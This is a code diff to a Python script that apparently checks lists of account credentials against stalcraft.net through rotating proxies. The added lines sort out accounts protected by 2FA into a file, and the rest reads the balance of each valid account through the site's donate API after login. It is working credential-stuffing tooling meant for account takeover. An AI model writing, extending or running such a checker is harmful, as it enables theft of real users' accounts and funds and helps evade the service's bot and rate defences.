@@ -53,6 +53,7 @@ def get_proxy():
                 proxy = {
                     "http": f"{proxy_type}://{username}:{password}@{ip}:{port}"
                 }
+                print(proxy)
 
             if is_proxy_valid(proxy):
                 return proxy
@@ -197,11 +198,20 @@ def worker():
                 additional_bot_check = response_login.get('additionalBotCheck')
 
                 if additional_bot_check is None:
+                    fa2 = response_login.get('otp')
+                    if fa2:
+                        print(f"{Style.BRIGHT}{Fore.YELLOW}[-] 2FA - {account}")
+                        with open('Result/2FA.txt', 'a') as file:
+                            file.write(account + '\n')
+                        break
+
                     if response_login['success'] == True:
+
                         authToken = response_login['token']
                         authResponse = requests.get('https://stalcraft.net/api/donate', proxies=proxy, headers={
                             'Authorization': f'Bearer {authToken}'
-                        }).json()
+                        })
+                        authResponse = authResponse.json()
                         balance = authResponse['balance']
 
                         print(f"{Style.BRIGHT}{Fore.GREEN}[+] Valid - {account} | Balance: {balance}")
